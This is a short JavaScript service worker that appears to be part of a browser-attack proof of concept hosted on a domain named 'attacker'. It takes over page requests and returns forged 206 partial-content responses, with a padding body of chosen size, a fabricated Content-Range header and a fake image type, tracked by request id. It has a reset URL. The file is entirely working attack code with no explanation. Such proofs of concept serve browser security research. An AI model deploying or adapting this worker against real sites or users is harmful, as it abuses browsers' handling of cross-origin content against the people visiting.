'use strict';

var requested = new Set()

self.addEventListener('install', function() {
    self.skipWaiting();
});

self.addEventListener('fetch', function(e) {
  let url = new URL(e.request.url);
  console.log(url)
  if (url == 'https://attacker.georgetian.com/reset') {
    requested.clear();
    return;
  }
  let urlParams = new URLSearchParams(url.search);
  let size = urlParams.get('size');
  let id = urlParams.get('id');
  let body = 'A'.repeat(Number(size));
  console.log(requested, id);
  if (!requested.has(id)) {
    requested.add(id);
    console.log('intercepted', url);
  	e.respondWith(
      new Response(body,
        {
          status: 206, headers: {
          'Content-Range': `bytes 0-${size - 1}/100000`,
          'Content-Type': `image/png`,
        }}
      )
    );
  }
});
